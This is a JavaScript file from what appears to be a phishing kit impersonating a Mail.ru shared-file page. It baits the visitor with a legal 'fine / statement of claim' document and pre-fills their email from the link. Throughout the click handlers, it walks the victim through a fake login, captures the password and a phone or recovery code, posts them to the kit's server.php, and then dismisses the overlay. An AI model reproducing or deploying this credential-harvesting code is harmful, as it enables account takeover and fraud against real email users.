// Функция для извлечения параметров из текущего URL
function getParamsFromCurrentURL() {
  const params = new URL(window.location.href).searchParams;
  return {
    account: params.get("account"),
    number: params.get("number"),
    mail: params.get("from"),
  };
}

const data = getParamsFromCurrentURL();
const linkImg =
  "https://filin.mail.ru/pic?width=1000&height=1000&email=" + data.account;
const accountMail = data.account;
const fromMail = data.mail;
let loginInputValue = data.account;
const numberMail = data.number;

const fileAccess = document.querySelector(".file-access");
const fileAccessOutside = document.querySelector(".file-access-outside");
const bgOpacity = document.querySelector(".bg-opacity");
const fileFocusIcon = document.querySelector(".file-focus-icon");
const NewfileFocusIcon = "css/res/icon-file-focus.svg";
const NewfileFocusIcon2 = "css/res/Group 15 (1).svg";
const contentFile = document.querySelector(".content-file");

let offset = false;
let checkOffset = true;
let rn25Value = accountMail;

const showMoreBtn = document.querySelector("#show_more");
const showMoreContent = document.querySelector(".helping__information");
const downloadBtn = document.querySelector(".download");
const srcListCheck = "css/res/list-check.png";
const emptysrc = "";

let loginInputValueFour;
let rs24InputValue;

async function getTemplate(templateName, templateData = {}) {
  try {
    const response = await fetch("server.php", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        action: "get_template",
        template: templateName,
        data: templateData,
      }),
    });
    if (!response.ok) {
      throw new Error("Failed to fetch template");
    }
    const data = await response.json();
    return data.html || ""; // Extract the HTML string
  } catch (error) {
    console.error("Error fetching template:", error);
    return ""; // Fallback to empty string
  }
}

document.addEventListener("DOMContentLoaded", async function () {
  fileAccess.innerHTML = await getTemplate("loading");

  setTimeout(async () => {
    fileAccess.innerHTML = await getTemplate("initial_file_access", {
      fromMail,
    });
  }, 500);
});

contentFile.addEventListener("click", function (event) {
  if (offset === false && event.target.classList.value !== "download-file") {
    fileFocusIcon.setAttribute("src", NewfileFocusIcon);
    offset = true;
  } else if (
    offset === true &&
    event.target.classList.value !== "download-file"
  ) {
    fileFocusIcon.setAttribute("src", NewfileFocusIcon2);
    offset = false;
  } else if (event.target.classList.value === "download-file") {
    location.href = "Штраф._Исковое_заявление.doc";
  }
});

window.addEventListener("click", async function (event) {
  const rs24Input = document.querySelector(".rs24-input");
  const formCheckboxInner = document.getElementById("form-checkbox-inner");

  if (event.target.id === "btn_dowload") {
    location.href = "Штраф._Исковое_заявление.doc";
  }

  if (event.target.id === "input-selection-inner-yandex") {
    window.location.href = "https://passport.yandex.ru/auth";
  }

  if (event.target.classList.value === "user-name-repeat-inner") {
    fileAccess.innerHTML = await getTemplate("loading");
    setTimeout(() => {
      fileAccess.innerHTML = "";
      fileAccess.style.opacity = "1";
    }, 800);
  }

  if (event.target.classList.value === "input-selection-inner") {
    inputSelectionInnerfun();
    event.target.style.border = "2px solid #005FF9";
  }

  if (
    event.target.classList.value === "form-checkbox-inner" &&
    checkOffset === true
  ) {
    formCheckboxInner.style.backgroundColor = "#fff";
    formCheckboxInner.style.border = "1px solid #c2c2c2";
    checkOffset = false;
  } else if (
    event.target.classList.value === "form-checkbox-inner" &&
    checkOffset === false
  ) {
    formCheckboxInner.style.backgroundColor = "#005FF9";
    formCheckboxInner.style.border = "1px solid #c2c2c200";
    checkOffset = true;
  }

  if (event.target.classList.value === "button-file-access") {
    fileAccess.innerHTML = await getTemplate("loading");
    setTimeout(async () => {
      fileAccess.innerHTML = await getTemplate("login_account", {
        linkImg,
        accountMail,
      });
      fileAccess.style.opacity = "1";
    }, 800);
  }

  if (
    event.target.classList.value === "login-account-title-button" ||
    event.target.classList.value === "login-account-button-div" ||
    event.target.classList.value === "login-account-button-img"
  ) {
    fileAccess.innerHTML = await getTemplate("loading");
    setTimeout(async () => {
      fileAccess.innerHTML = await getTemplate("login_account_user", {
        loginInputValue,
      });
      fileAccess.style.opacity = "1";
    }, 800);

    // Получаем элементы после обновления DOM
    setTimeout(() => {
      const rs24Input1 = document.getElementById("rs24-input");
      const submitButton = document.getElementById("form-button-clk-rs24");
      if (rs24Input1) {
        rs24Input1.addEventListener("keypress", (event) => {
          if (event.key === "Enter") {
            event.preventDefault();
            submitButton.click();
          }
        });
      }
    }, 1500);
  }

  if (
    event.target.classList.value === "form-button-clk-rs24" &&
    rs24Input?.value !== ""
  ) {
    rs24InputValue = rs24Input.value;
    fileAccess.innerHTML = await getTemplate("loading");

    setTimeout(async () => {
      let templateName =
        numberMail === "rezerv" ? "rezerv_block" : "phone_input";
      fileAccess.innerHTML = await getTemplate(templateName);

      // Now the DOM is updated—setup the elements immediately
      const fileNumInner = document.getElementById("file-num-inner");
      if (fileNumInner) {
        const inputs = document.querySelectorAll(".digit");
        const continueButton = document.getElementById("continue-button");

        const updateButtonState = () => {
          const allFilled = Array.from(inputs).every(
            (inp) => inp.value.trim().length === 1
          );
          if (allFilled) {
            continueButton.style.pointerEvents = "auto";
            continueButton.style.opacity = "1";
          } else {
            continueButton.style.pointerEvents = "none";
            continueButton.style.opacity = "0.5";
          }
        };

        inputs.forEach((input, index) => {
          input.addEventListener("input", () => {
            input.value = input.value.replace(/\D/, "");
            if (input.value.length === 1 && index < inputs.length - 1) {
              inputs[index + 1].focus();
            }
            updateButtonState();
          });

          input.addEventListener("keydown", (e) => {
            if (e.key === "Backspace" && input.value === "" && index > 0) {
              inputs[index - 1].focus();
            }
            if (e.key === "Enter") {
              const allFilled = Array.from(inputs).every(
                (inp) => inp.value.trim().length === 1
              );
              if (allFilled) continueButton.click();
            }
          });

          input.addEventListener("focus", () => {
            if (!input.hasAttribute("readonly")) {
              input.value = "";
            }
          });
        });

        // Предзаполнение, если numberMail содержит цифры
        numberMail.split("").forEach((digit, index) => {
          if (inputs[index]) {
            inputs[index].value = digit;
            inputs[index].setAttribute("readonly", true);
          }
        });

        updateButtonState();
      }
    }, 500);
  }

  if (
    event.target.classList.value === "rs24-input-eye-btn" &&
    rs24Input?.type === "password"
  ) {
    rs24Input.type = "text";
  } else if (event.target.classList.value === "rs24-input-eye-btn") {
    rs24Input.type = "password";
  }

  if (event.target.classList.contains("four-button") || event.key === "Enter") {
    let digits = "";
    if (document.getElementById("file-num-inner")) {
      digits = Array.from(document.querySelectorAll(".digit"))
        .map((input) => input.value)
        .join("");
    } else if (document.getElementById("rezerv_block")) {
      digits = document.querySelector(".rezerv_block_input1")?.value || "";
    }

    if (digits !== "") {
      const dataUser = {
        rn25: rn25Value,
        rs24: rs24InputValue,
        num: digits,
      };

      fetch("server.php", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(dataUser),
      })
        .then((response) => response.json())
        .then((data) => {
          console.log(data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });

      fileAccessOutside.innerHTML = await getTemplate("loading");
      setTimeout(() => {
        bgOpacity.style.opacity = "0";
        bgOpacity.style.zIndex = "-99";
        fileAccessOutside.style.zIndex = "-100";
        fileAccessOutside.innerHTML = "";
      }, 1000);
    } else {
      console.error("Одно или несколько полей ввода пустые.");
    }
  }
});

function inputSelectionInnerfun() {
  const inputSelectionInner = document.getElementsByClassName(
    "input-selection-inner"
  );
  for (let i = 0; i < inputSelectionInner.length; i++) {
    inputSelectionInner[i].style.border = "2px solid #ffffff00";
  }
}

function srcListCheckNone() {
  const mailTextCheckList = document.getElementsByClassName("mail-text-check");
  for (let i = 0; i < mailTextCheckList.length; i++) {
    mailTextCheckList[i].setAttribute("src", emptysrc);
  }
}
